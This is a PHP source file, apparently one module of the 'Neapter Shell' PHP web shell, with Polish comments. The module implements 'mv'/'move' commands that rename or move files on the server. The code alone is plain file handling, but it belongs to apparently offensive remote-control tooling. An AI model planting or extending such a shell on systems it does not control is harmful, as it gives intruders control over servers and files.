<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Przenoszenie pliku / katalogu
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleMv extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array(
            'mv',
            'move',
        );
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        /**
         * Wersja Data Autor
         */
        return '1.0.1 2011-06-23 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Przenoszenie pliku

	Użycie:
		mv plik_lub_katalog_źródłowy plik_lub_katalog_docelowy
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        /**
         * Help
         */
        if ($this->oArgs->getNumberOfParams() !== 2) {
            return self::getHelp();
        }

        $sSource = $this->oArgs->getParam(0);
        $sDestination = $this->oArgs->getParam(1);

        if (!@ rename($sSource, $sDestination)) {
            $sMsg = 'Plik "%s" <span class="red">nie został przeniesiony</span> do "%s"';
        } else {
            $sMsg = 'Plik "%s" <span class="green">został przeniesiony</span> do "%s"';
        }

        return sprintf($sMsg, $sSource, $sDestination);
    }

}
